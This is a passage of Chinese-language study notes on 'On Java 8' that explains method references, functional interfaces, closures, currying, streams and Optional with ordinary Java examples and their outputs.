[6]将show方法的引用赋给一个Callable对象,此时相当于show方法为Callable接口的call方法的实现    c.call(&quot;call()&quot;);                       // [7]调用call()方法,实际上是调用了show()方法,因为Java将call映射到了show上    c = MethodReferences::hello;            // [8] 静态方法可以不创建实例    c.call(&quot;Bob&quot;);    c = new Description(&quot;valuable&quot;)::help;  // [9] 这是[6]的另一个实现,需要创建实例    c.call(&quot;information&quot;);    c = Helper::assist;                     // [10] 静态内部类的静态方法    c.call(&quot;Help!&quot;);  &#125;&#125;/* Output:call()Hello, Bobvaluable informationHelp!*/</code></pre><h4 id="13.3.1-runnable%E6%8E%A5%E5%8F%A3" tabindex="-1">13.3.1 Runnable接口</h4><ul><li>Runnable接口在Java.lang包中,不需要import,它只有一个run()方法,没有参数,也没有返回值,因此可以使用lambda表达式或方法引用来实现</li><li>例子:Tread对象接收一个Runnable对象作为其构造器,其有一个start方法会调用run()方法,因此可以使用lambda表达式或方法引用来实现</li></ul><pre><code class="language-java">class Go &#123;  static void go() &#123;    System.out.println(&quot;Go::go()&quot;);  &#125;&#125;public class RunnableMethodReference &#123;  public static void main(String[] args) &#123;    new Thread(new Runnable() &#123;      public void run() &#123;        System.out.println(&quot;Anonymous&quot;);      &#125;    &#125;).start();    new Thread(      () -&gt; System.out.println(&quot;lambda&quot;)    ).start();    new Thread(Go::go).start();  &#125;&#125;</code></pre><h4 id="13.3.2-%E6%9C%AA%E7%BB%91%E5%AE%9A%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8" tabindex="-1">13.3.2 未绑定方法引用</h4><ul><li><strong>未绑定方法引用</strong>（unbound method reference）指的是尚未关联到某个对象的普通（非<br>静态）方法。对于未绑定引用，必须先提供对象，然后才能使用</li></ul><pre><code class="language-java">class X &#123;  String f() &#123; return &quot;X::f()&quot;; &#125;&#125;interface MakeString &#123;  String make();&#125;interface TransformX &#123;  String transform(X x);&#125;public class UnboundMethodReference &#123;  public static void main(String[] args) &#123;    // MakeString ms = X::f; // [1]    TransformX sp = X::f;    X x = new X();    System.out.println(sp.transform(x)); // [2]    System.out.println(x.f()); // 效果相同  &#125;&#125;</code></pre><ul><li><p>[1] 处编译器会报错,提示 无效方法引用”（invalid method reference）,即使make()的签名和f()相同,这里需要重点理解:</p><ul><li>这里涉及一个隐藏的参数:this,如果没有可以附着的X对象,就无法调用f(),因此,X::f是一个未绑定的方法引用,其没有绑定到某个对象,因此无法调用</li><li>所以我们的接口还需要一个额外的参数,如TransformX接口中的transform()方法,其需要一个X对象作为参数,那么我们就可以使用X::f来实现这个接口</li><li>即在未绑定引用的情况下,<strong>函数式方法</strong>(接口中的单一方法)的签名和方法引用的签名不再完全匹配,此时我们需要一个对象,让方法在其上调用</li></ul></li><li><p>[2]处因为接受了未绑定引用,然后调用了transform()方法,传入了一个X对象,因此可以正常运行,即Java知道它需要接收第一个参数,即this指针,然后调用f()方法</p></li><li><p>综上所述,未绑定方法的引用,其X::f的第一个参数是其this指针,即需要额外传入一个对象,然后才能调用f()方法,下面为有参数的情况</p></li></ul><pre><code class="language-java">class This &#123;  void two(int i, double d) &#123;&#125;  void three(int i, double d, String s) &#123;&#125;  void four(int i, double d, String s, char c) &#123;&#125;&#125;//下面为函数式方法,第一个参数都是this指针,意味着使用该方法时需要额外传入对象interface TwoArgs &#123;  void call2(This athis, int i, double d);&#125;interface ThreeArgs &#123;  void call3(This athis, int i, double d, String s);&#125;interface FourArgs &#123;  void call4(    This athis, int i, double d, String s, char c);&#125;public class MultiUnbound &#123;  public static void main(String[] args) &#123;    TwoArgs twoargs = This::two;    ThreeArgs threeargs = This::three;    FourArgs fourargs = This::four;    This athis = new This();    twoargs.call2(athis, 11, 3.14);    threeargs.call3(athis, 11, 3.14, &quot;Three&quot;);    fourargs.call4(athis, 11, 3.14, &quot;Four&quot;, 'Z');  &#125;&#125;</code></pre><h4 id="13.3.3-%E6%9E%84%E9%80%A0%E5%99%A8%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8" tabindex="-1">13.3.3 构造器方法引用</h4><pre><code class="language-java">class Dog &#123;  String name;  int age = -1; // For &quot;unknown&quot;  Dog() &#123; name = &quot;stray&quot;; &#125;  Dog(String nm) &#123; name = nm; &#125;  Dog(String nm, int yrs) &#123; name = nm; age = yrs; &#125;&#125;interface MakeNoArgs &#123;  Dog make();&#125;interface Make1Arg &#123;  Dog make(String nm);&#125;interface Make2Args &#123;  Dog make(String nm, int age);&#125;public class CtorReference &#123;  public static void main(String[] args) &#123;    MakeNoArgs mna = Dog::new;        // [1]    Make1Arg m1a = Dog::new;          // [2]    Make2Args m2a = Dog::new;         // [3]    Dog dn = mna.make();    Dog d1 = m1a.make(&quot;Comet&quot;);    Dog d2 = m2a.make(&quot;Ralph&quot;, 4);  &#125;&#125;</code></pre><ul><li>上述代码中,Dog有三个构造器,分别为无参构造器,一个参数的构造器,两个参数的构造器</li><li>这三个构造器只有一个名字new,但可以通过接口来判断是那个构造器</li></ul><h3 id="13.4-%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3" tabindex="-1">13.4 函数式接口</h3><ul><li>方法引用和lambda表达式都要赋值,赋值就需要类型信息</li><li>如何确定方法的参数类型呢,为此Java8引入包含一组接口的Java.util.function,这些接口时lambda表达式和方法引用的目标类型,每个接口只包含一个抽象方法,叫做<strong>函数式方法</strong><ul><li>当编写接口时,这种&quot;函数式方法&quot;可以使用@FunctionalInterface注解来强制编译器只接受函数式接口</li></ul></li><li>例子: @FunctionalInterface注解的使用<ul><li>@FunctionalInterface注解 是可选的,一旦出现,该接口只能拥有一个函数式方法,否则编译器会报错</li><li>使用了 @FunctionalInterface 注解的接口也叫作<strong>单一抽象方法</strong>（Single Abstract Method, SAM）类型</li></ul></li><li>我们可以将方法直接赋给<strong>函数式接口</strong>,这是Java8增加的魔法:如果我们将一个方法引用或lambda表达式赋值给某个函数式接口(而且类型可以匹配),那么Java会调整这个赋值，使其匹配目标接口。而在底层，Java 编译器会创建一个实现了目标接口的类的实例，并将我们的方法引用或 lambda 表达式包裹在其中<ul><li>这种魔法使得语法更好,更简单</li></ul></li></ul><pre><code class="language-java">@FunctionalInterfaceinterface Functional &#123;  String goodbye(String arg);&#125;interface FunctionalNoAnn &#123;  String goodbye(String arg);&#125;/*@FunctionalInterfaceinterface NotFunctional &#123;  String goodbye(String arg);  String hello(String arg);&#125;产生报错信息：NotFunctional is not a functional interfacemultiple non-overriding abstract methodsfound in interface NotFunctional*/public class FunctionalAnnotation &#123;  public String goodbye(String arg) &#123;    return &quot;Goodbye, &quot; + arg;  &#125;  public static void main(String[] args) &#123;    FunctionalAnnotation fa =      new FunctionalAnnotation();    Functional f = fa::goodbye;    FunctionalNoAnn fna = fa::goodbye;    // Functional fac = fa; // Incompatible    Functional fl = a -&gt; &quot;Goodbye, &quot; + a;    FunctionalNoAnn fnal = a -&gt; &quot;Goodbye, &quot; + a;  &#125;&#125;</code></pre><ul><li>java.util.function 旨在创建一套足够完备的目标接口，这样一般情况下我们就不需要定义自己的接口了。然后由于基本类型的缘故,接口很多,但我们可以通过理解其命名规则知道特定接口. 这里不多赘述,用时再查<ul><li>使用java.util.function的函数式接口时,名字并不重要,重要的只有参数类型和返回类型,Java会将我们的函数自动映射到函数式接口中的方法上,需要调用函数式接口里的函数<br><img src="/images/PL/OnJava8/13_4_0.png" alt></li></ul></li></ul><h4 id="13.4.1-%E5%B8%A6%E6%9C%89%E6%9B%B4%E5%A4%9A%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3" tabindex="-1">13.4.1 带有更多参数的函数式接口</h4><pre><code class="language-java">@FunctionalInterfacepublic interface TriFunction&lt;T, U, V, R&gt; &#123; R apply(T t, U u, V v);&#125;public class TriFunctionTest &#123;  static int f(int i, long l, double d) &#123; return 99; &#125;  public static void main(String[] args) &#123;    TriFunction&lt;Integer, Long, Double, Integer&gt; tf =      TriFunctionTest::f;      tf = (i, l, d) -&gt; 12;  &#125;&#125;</code></pre><h4 id="13.4.2-%E8%A7%A3%E5%86%B3%E7%BC%BA%E4%B9%8F%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">13.4.2 解决缺乏基本类型函数式接口的问题</h4><ul><li>因为基本类型设计自动装箱和拆箱,因此会有性能问题,因此Java8基本类型的函数式接口缺失,但我们可以自己定义</li></ul><h3 id="13.5-%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0" tabindex="-1">13.5 高阶函数</h3><ul><li><strong>高阶函数</strong>只是一个能接受函数作为参数或能把函数当返回值的函数。</li></ul><pre><code class="language-java">interface FuncSS extends Function&lt;String, String&gt; &#123;&#125;   // [1] 使用继承为专门的接口起一个别名public class ProduceFunction &#123;  static FuncSS produce() &#123;//该函数可以返回一个函数    return s -&gt; s.toLowerCase();               &#125;  public static void main(String[] args) &#123;    FuncSS f = produce();    System.out.println(f.apply(&quot;YELLING&quot;));  &#125;&#125;</code></pre><ul><li>接收使用函数时需要主要正确描述函数的类型,同时在函数中可以生成一个新的函数</li><li>下面例子中,transform()接受一个方法同时也生成一个方法<ul><li>这里使用了Function 接口中的一个叫作andThen()的默认（default）方法，该方法<br>是为操作函数而设计。andThen()会在in函数调用<strong>之后</strong>调用(还有一个compose的方法,可以在in函数之前应用新函数)</li></ul></li></ul><pre><code class="language-java">class I &#123;  @Override public String toString() &#123; return &quot;I&quot;; &#125;&#125;class O &#123;  @Override public String toString() &#123; return &quot;O&quot;; &#125;&#125;public class TransformFunction &#123;  static Function&lt;I,O&gt; transform(Function&lt;I,O&gt; in) &#123;    return in.andThen(o -&gt; &#123;      System.out.println(o);      return o;    &#125;);  &#125;  public static void main(String[] args) &#123;    Function&lt;I,O&gt; f2 = transform(i -&gt; &#123;      System.out.println(i);      return new O();    &#125;);    O o = f2.apply(new I());  &#125;&#125;/* Output:IO*/</code></pre><h3 id="13.6-%E9%97%AD%E5%8C%85" tabindex="-1">13.6 闭包</h3><ul><li>当lambda表达式使用了其函数作用域之外的变量时,会发生什么?<ul><li>这就是<strong>闭包</strong>的概念,如果语言能解决这个问题,称这个语言是支持闭包的,也可以称之为支持<strong>语法作用域</strong></li><li>这里同时也有一个<strong>变量捕获</strong>的术语,即lambda表达式捕获了其作用域之外的变量</li></ul></li></ul><pre><code class="language-java">public class Closure1 &#123; int i; IntSupplier makeFun(int x) &#123; return () -&gt; x + i++; &#125;&#125;</code></pre><ul><li>Closure1中,因为变量i位于对象中,随意遍历makeFun返回的函数中,i可以指向正确的位置,因此会有多个函数全部共享i的存储空间</li></ul><pre><code class="language-java">public class Closure2 &#123; IntSupplier makeFun(int x) &#123; int i = 0; return () -&gt; x + i; &#125;&#125;public class Closure3 &#123; IntSupplier makeFun(int x) &#123; int i = 0; // x++ 或 i++ 都不可以： return () -&gt; x++ + i++; &#125;&#125;error:local variables referenced from a lambdaexpression must be final or effectively final</code></pre><ul><li>Closure3中,i为临时变量,函数返回后x和i都无法找到正确的内存位置,会发生报错</li><li>而在Closuer2中,没有报错:因为i没有发生变化,实际上这里是<strong>实际上的最终变量(effective final)</strong>,该术语由Java 8 创建,其意思是我们虽然没有显式地将一个变量声明为最终变量,但是仍然可以用最终变量地方式看待它,只要不改变其值即可. <code>如果一个局部变量的初始值从不改变,它就是实际上的最终变量</code></li></ul><pre><code class="language-java">public class Closure6 &#123; IntSupplier makeFun(int x) &#123; int i = 0; i++; x++; final int iFinal = i;/*这里的final可以去掉,因之后未改变,已经构成&quot;实际上的最终变量&quot;*/ final int xFinal = x; return () -&gt; xFinal + iFinal; &#125;&#125;</code></pre><ul><li><p>如果非要使用变化的临时变量,我们可以用final变量进行中继</p></li><li><p>以上讨论都在基本类型中,下面讨论在对象中的情况</p></li></ul><pre><code class="language-java">public class Closure8 &#123;  Supplier&lt;List&lt;Integer&gt;&gt; makeFun() &#123;    final List&lt;Integer&gt; ai = new ArrayList&lt;&gt;();/*这里的final可以去掉,因之后未改变,已经构成&quot;实际上的最终变量&quot;*/    ai.add(1);    return () -&gt; ai;  &#125;  public static void main(String[] args) &#123;    Closure8 c7 = new Closure8();    List&lt;Integer&gt;      l1 = c7.makeFun().get(),      l2 = c7.makeFun().get();    System.out.println(l1);    System.out.println(l2);    l1.add(42);    l2.add(96);    System.out.println(l1);    System.out.println(l2);  &#125;&#125;/* Output:[1][1][1, 42][1, 96]*/</code></pre><ul><li>上述代码运行成功了,可能你们会感到疑惑,但这里需要提醒的是,对于<strong>final修饰的对象引用,说明该对象引用不能被重新赋值</strong>,所以该引用指向的对象是可以发生变化的,但不能被另一个新的对象赋值,所以Closure8中,ai的final去掉也不会出现问题,因为构成了&quot;实际上的最终变量&quot;</li><li>但是如果我们将ai重新赋值,就会出现问题,如下:</li></ul><pre><code class="language-java">// 无法通过编译import java.util.*;import java.util.function.*;public class Closure9 &#123; Supplier&lt;List&lt;Integer&gt;&gt; makeFun() &#123; List&lt;Integer&gt; ai = new ArrayList&lt;&gt;(); ai = new ArrayList&lt;&gt;(); // Reassignment return () -&gt; ai; &#125;&#125;</code></pre><ul><li><p>综上,lambda使用的变量</p><ul><li>可以是&quot;实际上的最终变量&quot;,即该变量不能被重新赋值,但是可以修改其指向的对象</li><li>也可以是某对象的一个字段,因为其有独立的生命周期,不需要任何的捕获,因此可以被lambda使用</li></ul></li><li><p>内部类中的闭包,与高级函数类似,所以实际上,只要有内部类,就会出现闭包的概念(Java 8只是让闭包的实现变简单了). Java8之前没有&quot;实际上的最终变量&quot;,都需要显式声明</p></li></ul><h3 id="13.7-%E5%87%BD%E6%95%B0%E7%BB%84%E5%90%88" tabindex="-1">13.7 函数组合</h3><ul><li><strong>函数组合</strong>:将多个函数结合使用以创建新的函数,这是函数式编程的基本技术之一</li><li>java.util.function提供的函数组合方法<ul><li><code>andThen(argument)</code>:先执行原始操作,再执行参数操作</li><li><code>compose(argument)</code>:先执行参数操作,再执行原始操作</li><li><code>and(argument)</code>:对原始谓词和参数谓词执行逻辑与操作</li><li><code>or(argument)</code>:对原始谓词和参数谓词执行逻辑或操作</li><li><code>negate(argument)</code>:对所得谓词进行逻辑取反</li></ul></li></ul><pre><code class="language-java">f4 = f1.compose(f2).andThen(f3);//执行顺序:f2,f1,f3f4 = f1.compose(f3).compose(f1).compose(f2);//执行顺序 f2,f1,f3,f1 倒序执行f4 = f1.andThen(f3).andThen(f1).andThen(f2);//执行顺序 f1,f3,f1,f2 顺序执行f4 = f1.andThen(f3).compose(f1).andThen(f2).compose(f2);//执行顺序 f2,f1,f1,f3,f2</code></pre><h3 id="13.8-%E6%9F%AF%E9%87%8C%E5%8C%96%E5%92%8C%E9%83%A8%E5%88%86%E6%B1%82%E5%80%BC" tabindex="-1">13.8 柯里化和部分求值</h3><ul><li><strong>柯里化</strong>(currying)是一种将具备多个参数的函数转换成一系列使用一个参数的函数的技术</li><li>Java中实现:定义多层函数,每层函数都是单一参数,每层函数返回下一层函数,最后一层函数返回结果</li></ul><pre><code class="language-java">public class CurryingAndPartials &#123;   // 未柯里化:   static String uncurried(String a, String b) &#123;      return a + b;   &#125;   public static void main(String[] args) &#123;      // 柯里化函数      Function&lt;String, Function&lt;String, String&gt;&gt; sum =         a -&gt; b -&gt; a + b;                               System.out.println(uncurried(&quot;Hi &quot;, &quot;Ho&quot;));      Function&lt;String, String&gt;        hi = sum.apply(&quot;Hi &quot;);                          System.out.println(hi.apply(&quot;Ho&quot;));      // 应用      Function&lt;String, String&gt; sumHi =        sum.apply(&quot;Hup &quot;);      System.out.println(sumHi.apply(&quot;Ho&quot;));      System.out.println(sumHi.apply(&quot;Hey&quot;));   &#125;&#125;/* Output:Hi HoHi HoHup HoHup Hey*/public class Curry3Args &#123;//3个函数的柯里化   public static void main(String[] args) &#123;      Function&lt;String,        Function&lt;String,          Function&lt;String, String&gt;&gt;&gt; sum =            a -&gt; b -&gt; c -&gt; a + b + c;      Function&lt;String,        Function&lt;String, String&gt;&gt; hi =          sum.apply(&quot;Hi &quot;);      Function&lt;String, String&gt; ho =        hi.apply(&quot;Ho &quot;);      System.out.println(ho.apply(&quot;Hup&quot;));   &#125;&#125;/* Output:Hi Ho Hup*/</code></pre><h3 id="13.9-%E7%BA%AF%E5%87%BD%E6%95%B0%E5%BC%8F%E5%8F%98%E6%88%90%2613.10-%E6%80%BB%E7%BB%93" tabindex="-1">13.9 纯函数式变成&amp;13.10 总结</h3><ul><li>因为Java<strong>并不是不可变语言</strong>,所以我们需要仔细设计,让所有内容都是final的,确保方法和函数没有副作用</li><li>lambda表达式和方法引用不是将Java变成函数式语言,而是提供了对函数式编程风格的更多支持</li></ul><h2 id="14-%E6%B5%81" tabindex="-1">14 流</h2><ul><li>流的核心优点:使得程序更小,同时可以充分发挥lambda表达式和方法引用的威力</li><li><strong>声明式编程</strong>:是一种编程风格,我们说明想要完成<strong>什么what</strong>,而不是指明<strong>怎么做how</strong></li><li>流具有<strong>惰性求值</strong>:只有在绝对必要时才会被求值,这种方式可以避免不必要的计算,同时可以提高性能</li></ul><h3 id="14.1-java8-%E5%AF%B9%E6%B5%81%E7%9A%84%E6%94%AF%E6%8C%81" tabindex="-1">14.1 Java8 对流的支持</h3><ul><li>Java系列是需要保留之前的一切的,为此需要考虑如何将流加入库中,而不会破坏之前的代码</li><li>而问题的最大挑战在使用了接口的库,不能轻易给接口增加新方法,因为这会破坏之前的代码,所以Java8使用了<strong>默认方法</strong>来解决这个问题,将流方法添加到了接口中,但是这些方法都是默认方法,因此不会破坏之前的代码,方法可分为三种类型<ul><li>创建流</li><li>修改流元素(<strong>中间操作</strong>)</li><li>消费流元素(<strong>终结操作</strong>):其意味着收集一个流的元素</li></ul></li></ul><h3 id="14.2-%E6%B5%81%E7%9A%84%E5%88%9B%E5%BB%BA" tabindex="-1">14.2 流的创建</h3><ul><li>使用**Stream.of()**可以将一个条目变为一个流</li><li>每个<strong>Collection</strong>可以使用stream()方法生成一个流</li><li>IntStream 类提供了一个 <strong>range()</strong> 方法，可以生成一个流—由 int 值组成的序列</li></ul><pre><code class="language-java">for(int i : range(10, 20).toArray()) result += i;</code></pre><ul><li>**generate()**方法是Java 8中Stream API中的一个方法，它用于生成一个无限的、连续的Stream。<ul><li>具体来说，generate()方法接收一个Supplier接口类型的参数，这个参数是一个无限循环的生产者，它会不断地生产出一个新的元素，并将其放入Stream中</li><li>我们可以通过limit限制产生个数</li></ul></li></ul><pre><code class="language-java">public class Generator implements Supplier&lt;String&gt; &#123;  Random rand = new Random(47);// 设置随机种子  char[] letters =    &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;.toCharArray();  @Override public String get() &#123;     return &quot;&quot; + letters[rand.nextInt(letters.length)];//返回限制的数字大小  &#125;  public static void main(String[] args) &#123;    String word = Stream.generate(new Generator())      .limit(30)//限制个数      .collect(Collectors.joining());    System.out.println(word);  &#125;&#125;/* Output:YNZBRNYGCFOWZNTCQRGSEGZMMJMROE*/</code></pre><ul><li><strong>iterate()</strong>:Stream.iterate()从第一个参数开始,然后将其传给第二个参数引用的方法,结果被添加到流上,并且保存下来作为下一次 iterate()调用的第一个参数,以此类推<ul><li>例子:生成FIB数列</li></ul></li></ul><pre><code class="language-java">public class Fibonacci &#123;  int x = 1;  Stream&lt;Integer&gt; numbers() &#123;    return Stream.iterate(0, i -&gt; &#123;      int result = x + i;      x = i;      return result;    &#125;);  &#125;  public static void main(String[] args) &#123;    new Fibonacci().numbers()      .skip(20) // 跳过前20个      .limit(10) // 取10个      .forEach(System.out::println);  &#125;&#125;/* Output:67651094617711286574636875025121393196418317811514229*/</code></pre><ul><li><strong>流生成器</strong>:生成器设计模式中,创建一个生成器对象,为其提供多段构造信息,最后执行&quot;生成&quot;动作</li></ul><pre><code class="language-java">public class FileToWordsBuilder &#123;  Stream.Builder&lt;String&gt; builder = Stream.builder();//创建一个builder,可以向其中添加对象  public FileToWordsBuilder(String filePath)  throws Exception &#123;    Files.lines(Paths.get(filePath))      .skip(1) // 跳过第一行      .forEach(line -&gt; &#123;        for(String w : line.split(&quot;[ .?,]+&quot;))          builder.add(w);      &#125;);  &#125;  Stream&lt;String&gt; stream() &#123; return builder.build(); &#125;  public static void  main(String[] args) throws Exception &#123;    new FileToWordsBuilder(&quot;Cheese.dat&quot;).stream()      .limit(7)      .map(w -&gt; w + &quot; &quot;)      .forEach(System.out::print);  &#125;&#125;</code></pre><ul><li><strong>Arrays类</strong>使用stream()是可以指定流的区间<ul><li>下面代码中,选择区间[3,6) 进行输出</li></ul></li></ul><pre><code class="language-java">Arrays.stream(new int[] &#123; 1, 3, 5, 7, 15, 28, 37 &#125;, 3, 6)      .forEach(n -&gt; System.out.format(&quot;%d &quot;, n));//output:7 15 28</code></pre><h3 id="14.3-%E4%B8%AD%E9%97%B4%E6%93%8D%E4%BD%9C" tabindex="-1">14.3 中间操作</h3><ul><li><strong>1 调试与跟踪:peek()</strong>:用来辅助调试,允许查看流对象进行操作但不能不修改</li></ul><pre><code class="language-java">class Peeking  &#123;  public static void  main(String[] args) throws Exception &#123;    FileToWords.stream(&quot;Cheese.dat&quot;)      .skip(21)      .limit(4)      .map(w -&gt; w + &quot; &quot;)      .peek(System.out::print)      .map(String::toUpperCase)      .peek(System.out::print)      .map(String::toLowerCase)      .forEach(System.out::print);  &#125;&#125;/* Output:Well WELL well it IT it s S s so SO so*/</code></pre><ul><li><strong>2 对流元素及逆行排序:sorted()</strong>:进行排序,同时也有接收Comparator参数,或函数引用的sorted类型</li></ul><pre><code class="language-java">public class SortedComparator &#123;  public static void  main(String[] args) throws Exception &#123;    FileToWords.stream(&quot;Cheese.dat&quot;)      .skip(10)      .limit(10)      .sorted(Comparator.reverseOrder())      .map(w -&gt; w + &quot; &quot;)      .forEach(System.out::print);  &#125;&#125;</code></pre><ul><li><strong>3 移除元素</strong><ul><li><strong>distinct()</strong>:移除流中的重复元素</li><li><strong>filter(Predicate)</strong>:保留符合条件的元素,也就是传给参数(即过滤函数),结果未true的元素</li></ul></li></ul><pre><code class="language-java">public class Prime &#123;  public static boolean isPrime(long n) &#123;    return rangeClosed(2, (long)Math.sqrt(n))//左闭右闭      .noneMatch(i -&gt; n % i == 0);  &#125;  public LongStream numbers() &#123;    return iterate(2, i -&gt; i + 1)      .filter(Prime::isPrime);  &#125;  public static void main(String[] args) &#123;    new Prime().numbers()      .limit(10)      .forEach(n -&gt; System.out.format(&quot;%d &quot;, n));    System.out.println();    new Prime().numbers()      .skip(90)      .limit(10)      .forEach(n -&gt; System.out.format(&quot;%d &quot;, n));  &#125;&#125;/* Output:2 3 5 7 11 13 17 19 23 29467 479 487 491 499 503 509 521 523 541*/</code></pre><ul><li><p><strong>4 将函数应用于每个流元素</strong></p><ul><li><strong>map(Function)</strong>:将Function应用于每个元素,并将结果放入流中</li><li>mapToInt(ToIntFunction)：同上，不过结果放在一个 IntStream 中</li><li>mapToLong(ToLongFunction)：同上，不过结果放在一个 LongStream 中</li><li>mapToDouble(ToDoubleFunction)：同上，不过结果放在一个 DoubleStream 中。</li></ul></li><li><p><strong>5 在应用map期间使用组合流</strong>:map函数生成的是一个流,我们有时需要将流展开为元素</p><ul><li><strong>flatMap(Function)</strong>:当Function生成为一个流时使用</li><li>flatMapToInt(ToIntFunction)：同上，不过结果放在一个 IntStream 中</li><li>flatMapToLong(ToLongFunction)：同上，不过结果放在一个 LongStream 中</li><li>flatMapToDouble(ToDoubleFunction)：同上，不过结果放在一个 DoubleStream 中。</li></ul></li></ul><pre><code class="language-java">public class StreamOfStreams &#123;  public static void main(String[] args) &#123;    Stream.of(1, 2, 3)      .map(i -&gt; Stream.of(&quot;Gonzo&quot;, &quot;Kermit&quot;, &quot;Beaker&quot;))      .map(e-&gt; e.getClass().getName())      .forEach(System.out::println);  &#125;&#125;/* Output:java.util.stream.ReferencePipeline$Headjava.util.stream.ReferencePipeline$Headjava.util.stream.ReferencePipeline$Head*/public class FlatMap &#123;  public static void main(String[] args) &#123;    Stream.of(1, 2, 3)      .flatMap(        i -&gt; Stream.of(&quot;Gonzo&quot;, &quot;Fozzie&quot;, &quot;Beaker&quot;))      .forEach(System.out::println);  &#125;&#125;/* Output:GonzoFozzieBeakerGonzoFozzieBeakerGonzoFozzieBeaker*/</code></pre><h3 id="14.4-optional" tabindex="-1">14.4 Optional</h3><ul><li><p>标准流操作会返回一个Optional对象,因为它们不能确保所要的结果一定存在。这些流操作列举如下。</p><ul><li><strong>findFirst()</strong>:返回包含第一个元素的Optional对象，如果流为空则返回Optional.empty()</li><li><strong>findAny()</strong>:返回包含任意元素的Optional对象，如果流为空则返回Optional.empty()</li><li><strong>max(),min()</strong>:返回包含最大值或最小值的Optional对象，如果流为空则返回Optional.empty()</li><li><strong>reduce()</strong>:使用BinaryOperator和Optional组合起来，将流中的元素反复结合起来，得到一个值，返回包含该值的Optional对象，如果流为空则返回Optional.empty()<ul><li>例子</li></ul><pre><code class="language-java">  OptionalInt reduced =    IntStream.range(0, 10)      .reduce((a, b) -&gt; a + b);  System.out.println(reduced.getAsInt());</code></pre></li><li><strong>average()</strong>:对于数值化的流 IntStream、LongStream 和DoubleStream，average() 操作将其结果包在一个 Optional 中，以防流为空的情况</li></ul></li><li><p>空流使用<code>Stream.&lt;String&gt;empty()</code>创建</p></li></ul><h4 id="14.4.1-%E4%BE%BF%E6%8D%B7%E5%87%BD%E6%95%B0" tabindex="-1">14.4.1 便捷函数</h4><ul><li>便捷函数用于或去Optional中的数据,简化了&quot;先检查再处理所包含对象&quot;的过程<ul><li><strong>ifPresent(Consumer)</strong>:如果Optional对象包含值，则对该值调用Consumer，否则不进行任何操作</li><li><strong>orElse(other)</strong>:如果Optional对象包含值，则返回该值，否则返回other</li><li><strong>orElseGet(Supplier)</strong>:如果Optional对象包含值，则返回该值，否则返回Supplier获得的值</li><li><strong>orElseThrow(Supplier)</strong>:如果Optional对象包含值，则返回该值，否则抛出由Supplier 继续生成的异常</li></ul></li></ul><pre><code class="language-java">public class Optionals &#123;  static void basics(Optional&lt;String&gt; optString) &#123;    if(optString.isPresent())      System.out.println(optString.get());    else      System.out.println(&quot;Nothing inside!&quot;);  &#125;  static void ifPresent(Optional&lt;String&gt; optString) &#123;    optString.ifPresent(System.out::println);  &#125;  static void orElse(Optional&lt;String&gt; optString) &#123;    System.out.println(optString.orElse(&quot;Nada&quot;));  &#125;  static void orElseGet(Optional&lt;String&gt; optString) &#123;    System.out.println(      optString.orElseGet(() -&gt; &quot;Generated&quot;));  &#125;  static void orElseThrow(Optional&lt;String&gt; optString) &#123;    try &#123;      System.out.println(optString.orElseThrow(        () -&gt; new Exception(&quot;Supplied&quot;)));    &#125; catch(Exception e) &#123;      System.out.println(&quot;Caught &quot; + e);    &#125;  &#125;  static void test(String testName,    Consumer&lt;Optional&lt;String&gt;&gt; cos) &#123;    System.out.println(&quot; === &quot; + testName + &quot; === &quot;);    cos.accept(Stream.of(&quot;Epithets&quot;).findFirst());    cos.accept(Stream.&lt;String&gt;empty().findFirst());  &#125;  public static void main(String[] args) &#123;    test(&quot;basics&quot;, Optionals::basics);    test(&quot;ifPresent&quot;, Optionals::ifPresent);    test(&quot;orElse&quot;, Optionals::orElse);    test(&quot;orElseGet&quot;, Optionals::orElseGet);    test(&quot;orElseThrow&quot;, Optionals::orElseThrow);  &#125;&#125;/* Output: === basics ===EpithetsNothing inside! === ifPresent ===Epithets === orElse ===EpithetsNada === orElseGet ===EpithetsGenerated === orElseThrow ===EpithetsCaught java.lang.Exception: Supplied*/</code></pre><h4 id="14.4.2-%E5%88%9B%E5%BB%BAoptional" tabindex="-1">14.4.2 创建Optional</h4><ul><li>要自己编写生成Optional的代码时,有以下三种静态方法可以使用<ul><li><strong>empty()</strong>:生成一个空的Optional对象</li><li><strong>of(value)</strong>:将一个非空值包装到Optional里,如果值为空,则抛出NullPointerException异常</li><li><strong>ofNullable(value)</strong>:如果不知道这个 value 是不是 null，使用这个方法。如果value 为 null，它会自动返回 Optional.empty，否则会将这个 value 包在一个Optional 中</li></ul></li></ul><pre><code class="language-java">class CreatingOptionals &#123;  static void  test(String testName, Optional&lt;String&gt; opt) &#123;    System.out.println(&quot; === &quot; + testName + &quot; === &quot;);    System.out.println(opt.orElse(&quot;Null&quot;));  &#125;  public static void main(String[] args) &#123;    test(&quot;empty&quot;, Optional.empty());    test(&quot;of&quot;, Optional.of(&quot;Howdy&quot;));    try &#123;      test(&quot;of&quot;, Optional.of(null));    &#125; catch(Exception e) &#123;      System.out.println(e);    &#125;    test(&quot;ofNullable&quot;, Optional.ofNullable(&quot;Hi&quot;));    test(&quot;ofNullable&quot;, Optional.ofNullable(null));  &#125;&#125;/* Output: === empty ===Null === of ===Howdyjava.lang.NullPointerException === ofNullable ===Hi === ofNullable ===Null*/</code></pre><h4 id="14.4.3-optional%E5%AF%B9%E8%B1%A1%E4%B8%8A%E7%9A%84%E6%93%8D%E4%BD%9C" tabindex="-1">14.4.3 Optional对象上的操作</h4><ul><li><p>有三种方法支持对Optional进行事后处理,数值化的Optional没有以上操作</p><ul><li><strong>map(Function)</strong>:如果Optional对象包含值，则对该值执行提供的mapping函数调用，返回一个Optional对象;否则返回Optional.empty()</li><li><strong>flatMap(Function)</strong>:和 map() 类似，但是所提供的映射函数会将结果包在 Optional中，这样 flatMap() 最后就不会再做任何包装了</li><li><strong>filter(Predicate)</strong>:：将 Predicate 应用于 Optional 的内容，并返回其结果。如果Optional 与 Predicate 不匹配，则将其转换为 empty。如果 Optional 